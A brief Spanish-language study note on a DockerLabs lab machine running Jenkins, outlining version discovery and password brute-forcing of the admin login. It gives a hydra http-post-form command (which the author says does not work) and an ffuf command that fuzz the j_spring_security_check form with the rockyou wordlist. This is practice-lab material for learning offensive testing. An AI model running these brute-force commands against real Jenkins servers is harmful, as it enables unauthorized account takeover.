- Tags : #fuerza_bruta #jenkins #recursos #recursos_dockerlabs  #ffuf 

Jenkins es un servidor open source de automatización escrito en java de integración continua

**Recurso** : Maquina Strong Jenkins Dockerlabs

1- Ver la version de Jenkis
2- Fuerza bruta con burpsuit

Primero con burpsuit capturamos la petición para posteriormente transferirla a hydra

![](../../../attachments/Pasted%20image%2020260216112402.png)

```bash
#este no funciona de manera correcta

hydra -l admin -P /usr/share/rockyou/rockyou.txt 172.17.1.12 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=:Invalid username or password" -V

-s 8080  #especificar puerto donde corre el servidor

j_username=^USER^&j_password=^PASS^ #Donde va a sustituir los valores USER y en PASS 

Submit=:Invalid username or password  #Parametro para identificar el mensaje que sale a cada inento fallido  
```

FFUF
```bash
ffuf -u http://172.17.0.2:8080/j_spring_security_check -r -c -w /home/quino/rockyou.txt -X POST -d 'j_username=admin&j_password=FUZZ&from=%2F&Submit=LoginError' -H 'Content-Type: application/x-www-form-urlencoded' -fl 9
```